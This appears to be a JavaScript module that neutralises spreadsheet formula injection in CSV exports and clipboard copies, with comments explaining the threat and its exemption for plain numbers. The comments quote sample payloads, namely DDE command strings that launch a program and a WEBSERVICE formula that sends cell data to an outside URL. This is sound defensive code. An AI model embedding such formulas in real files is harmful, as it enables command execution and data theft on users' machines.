/*
  lib/csv.js
  --------------------------------------------------------------------------
  Escaping for the two places tabular data leaves the app as text: a CSV
  export and a clipboard copy.

  WHY ITS OWN MODULE

  These live here rather than in lib/exporters.js because SheetGrid needs the
  clipboard one, and exporters.js opens with `import * as XLSX from 'xlsx'`.
  Importing it from a block component would drag the whole of SheetJS into the
  bundle for every table on the canvas — a few hundred kilobytes to reuse
  thirty lines.

  WHAT IT DEFENDS AGAINST

  Every major spreadsheet evaluates a cell beginning `=`, `+`, `-` or `@` when
  the file is opened. So a CSV is not an inert data format: it is a small
  program, and DataStudio was writing whatever the cell contained straight
  into one.

  The threat is not the user's own typing. It is a workbook someone SENT them.
  Import it, export it as CSV, and DataStudio has laundered
  `=cmd|'/c calc'!A1` or `=WEBSERVICE("http://…"&A1)` into a file that now
  carries the user's name on it. A copy is the same threat over a different
  transport: the paste target is usually Excel, where it evaluates just the
  same.
  -------------------------------------------------------------------------- */

/* A leading tab or CR counts, because the whitespace is stripped before the
   first character is judged — `\t=SUM(...)` is still a formula. */
const FORMULA_LEAD = /^[=+\-@\t\r]/

/* PLAIN NUMBERS ARE EXEMPT, AND THAT IS A DELIBERATE RISK DECISION.

   `-5` matches FORMULA_LEAD. Escaping it would turn every negative number in
   every export into the text `'-5` — in a tool built for data, that is not a
   rounding error, it is a corrupted file. And the exemption costs nothing:
   Excel "evaluates" -5 to -5. There is no side effect available inside a
   number literal, which is exactly why it is safe to leave alone.

   Anything else keeping a dangerous lead is escaped, including `-1+1` and
   `+cmd|'/c calc'!A0` — neither is a number, both are expressions. */
const PLAIN_NUMBER = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/

/** True when a spreadsheet would execute this value rather than display it. */
export function isFormulaLead(s) {
  return FORMULA_LEAD.test(s) && !PLAIN_NUMBER.test(s)
}

/**
 * One CSV cell.
 *
 * Prefixing with an apostrophe is the standard neutralisation. Quoting alone
 * is NOT a fix — Excel evaluates a quoted cell beginning `=` identically — but
 * an escaped value is force-quoted anyway, because a quoted field is the form
 * in which importers are most likely to read the apostrophe as a text marker
 * rather than as data.
 *
 * `\r` joins the quote triggers as well. It was missing, so a value with an
 * embedded carriage return broke the row structure of the file — a plain
 * correctness bug that happened to live in the same expression.
 */
export function csvCell(v) {
  const raw = String(v ?? '')
  if (isFormulaLead(raw)) return `"'${raw.replace(/"/g, '""')}"`
  return /[",\r\n]/.test(raw) ? `"${raw.replace(/"/g, '""')}"` : raw
}

/**
 * One clipboard cell, for a TSV copy.
 *
 * TSV has no escape syntax, so a tab or a newline inside a value cannot be
 * represented and becomes a space. That is a data-integrity fix as much as a
 * security one: a cell containing a newline used to become two rows on paste,
 * silently.
 */
export function tsvCell(v) {
  let s = String(v ?? '')
  if (isFormulaLead(s)) s = "'" + s
  return s.replace(/[\t\r\n]+/g, ' ')
}
